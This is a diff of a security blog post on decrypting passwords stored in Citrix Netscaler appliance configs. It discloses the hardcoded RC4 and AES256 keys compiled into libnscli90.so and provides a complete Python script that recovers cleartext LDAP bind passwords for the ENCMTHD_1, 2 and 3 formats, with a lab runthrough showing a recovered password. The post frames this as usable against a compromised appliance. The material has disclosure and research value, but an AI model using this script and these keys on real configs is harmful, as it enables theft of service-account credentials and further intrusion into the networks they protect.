@@ -6,90 +6,93 @@ permalink: /citrix-decrypt/
 
 ## Netscaler
 
-Netscaler has a hardcoded RC4 encryption key used to encrypt cleartext passwords stored in the config, such as for LDAP. The static encryption key exists in the libnscli90.so library. As of 10.5 this was `2286da6ca015bcd9b7259753c2a5fbc2`. (now updated, see below)
-
-The below python script will decrypt LDAP and similar encrypted values obtained from the config.
-````
-#!/usr/bin/python
-from Crypto.Cipher import ARC4
-import sys, binascii
-
-def decrypt(key, hex):
-        out_cipher = ARC4.new(key)
-        decoded = out_cipher.decrypt(hex)
-        return decoded
-
-def main():
-        #Key hardcoded into netscaler libnscli90.so
-        key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")
-
-        if len(sys.argv) == 2:
-            raw_in = sys.argv[1]
-            ciphertext = binascii.unhexlify(raw_in)
-            print decrypt(key,ciphertext)
-
-main()
-````
-
-## Update:
-
-This seems to have changed at some point and now ldap bind passwords are encrypted by default with a new technique (in the running config looks like 
-`add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf`)
-
-*If the config line says -kek at the end you'll need to pull key encryption keys off the appliance as well, see [this blog post for a reference on the Netscaler KEK](https://www.ferroquesystems.com/resource/citrix-adc-security-kek-files/) :*
+Citrix Netscaler (or whatever they're calling it now) uses hardcoded encryption keys to encrypt at least some passwords stored in the appliance config, most importantly for LDAP bind passwords. These static encryption keys are compliled into the `libnscli90.so` library on the appliance. As of 10.5 this was the RC4 key `2286da6ca015bcd9b7259753c2a5fbc2`. At some point they changed the default key and cipher used to encrypt cleartext values. The default key is now `351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9`, and the appliance now (12.0) uses AES256-CBC instead of RC4. I figured out after a quick bit of RE that the version signifier seems the be the `-encryptmethod` flag, where `ENCMTHD_3` signifies it is using AES256-CBC and the new default key.   
 
 
-Note the `-encryptmethod ENCMTHD_3` in the config. 
+### Additional notes
+If you add an old style (RC4) encrypted value to a newer appliance it will decrypt it, then re-encrypt using the new ENCMTHD_3 technique. A small number examples online appear to use the `ENCMTHD_2` value, which is uses the new key and AES256-ECB instead of CBC. 
 
-After some quick RE on a 12.0 type i figured out this ENCMTHD_3 is just AES256-CBC with a different key `351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9`. Heres the way to decrypt ENCMTHD_3 values (the default).
+*If the config line says -kek at the end you'll need to pull key encryption keys off the appliance and do a little more reversing, see [this blog post for a reference on the Netscaler KEK](https://www.ferroquesystems.com/resource/citrix-adc-security-kek-files/) :*
 
 
+## Decrypting
+Here's a quick guide on how to decrypt these LDAP passwords:
+
+1. If there is a `-kek` flag on the config line this means it is using a seperate key to encrypt the password instead of the hardcoded one. In theory you should be able to pull this off a compromised Netscaler but a config alone wont give you the cleartext. See [this blog post for a reference on the Netscaler KEK](https://www.ferroquesystems.com/resource/citrix-adc-security-kek-files/). I will look into doing this at some point and update this post.
+2. If there is no `ENCMTHD_` value, it is likely encrypted using the original RC4 method (I'm calling this ENCMTHD_1). You can decode this using the below script. 
+3. Otherwise if there is `ENCMTHD_3` or `ENCMTHD_2` and no `-kek` it uses the new AES256-CBC or AES256-ECB encryption method. You can also decode this using the below script.
+
+An example line from a new config may look like `add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf`
+indicating is is encrypted with AES256-CBC using the default key.
+
+Extract the ldapBindDnPassword and pass it to the script:
 ```
+# python decitrix.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f ENCMTHD_3
+test12345678secretldappassword
+```
+
+## Decrypting script
+The below python script will decrypt LDAP and likely similar encrypted values (haven't tested anything else) obtained from the config.
+```
+#!/usr/bin/python
+
 import base64
-from Crypto.Cipher import AES
-from Crypto import Random
-import binascii,sys  
+from Crypto.Cipher import AES,ARC4
+import binascii,sys
 
 
 BS = 16
 unpad = lambda s : s[:-ord(s[len(s)-1:])]
 
-#thanks  https://stackoverflow.com/a/12525165 for aes snippet
+#thanks  https://stackoverflow.com/a/12525165 for crypto snippet
 class AESCipher:
     def __init__( self, key ):
         self.key = key
 
-    def encrypt( self, raw ):
-        raw = pad(raw)
-        iv = Random.new().read( AES.block_size )
-        cipher = AES.new( self.key, AES.MODE_CBC, iv )
-        return base64.b64encode( iv + cipher.encrypt( raw ) ) 
+    def decrypt( self, enc, mode ):
+        if mode == "ENCMTHD_2":
+                cipher = AES.new(self.key, AES.MODE_ECB )
+        elif mode == "ENCMTHD_3":
+                iv = "\x00" * 16
+                cipher = AES.new(self.key, AES.MODE_CBC, iv )
 
-    def decrypt( self, enc ):
-        iv = "\x00" * 16
-        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        else:
+            print "Invalid mode"
+            return False
+
         return unpad(cipher.decrypt( enc ))
 
 
-
 def main():
-        #New Key hardcoded into netscaler libnscli90.so
-        key = binascii.unhexlify("351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9")
+        #Keys hardcoded into netscaler libnscli90.so
+        aeskey = binascii.unhexlify("351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9")
+        rc4key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")
 
-        if len(sys.argv) == 2:  
-            raw_in = sys.argv[1]
-            ciphertext = binascii.unhexlify(raw_in)
-            f = AESCipher(key)
-            decoded= f.decrypt(ciphertext)
-            print decoded[16:]
+        if len(sys.argv) == 3:
+            ciphertext = sys.argv[1]
+            mode = sys.argv[2]
+
+            if mode == "ENCMTHD_3" or mode == "ENCMTHD_2":
+                c = AESCipher(aeskey)
+                decoded = c.decrypt(binascii.unhexlify(ciphertext),mode)
+                if mode == "ENCMTHD_3":
+                        print decoded[16:]
+                else:
+                        print decoded
+
+            elif mode == "ENCMTHD_1": #old rc4 mode
+                out_cipher = ARC4.new(rc4key)
+                decoded = out_cipher.decrypt(binascii.unhexlify(ciphertext))
+                print decoded
 
 
-main()
-
+if __name__ == "__main__":
+        main()
 ```
 
 
-Runthrough
+
+#### Runthrough
 
 ```
 >add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword test12345678secretldappassword -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
@@ -99,8 +102,7 @@ Done
 add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
 ..snip..
 
-#python decrypt-new.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f
-
+# python decitrix.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f ENCMTHD_3
 test12345678secretldappassword
 ```
 
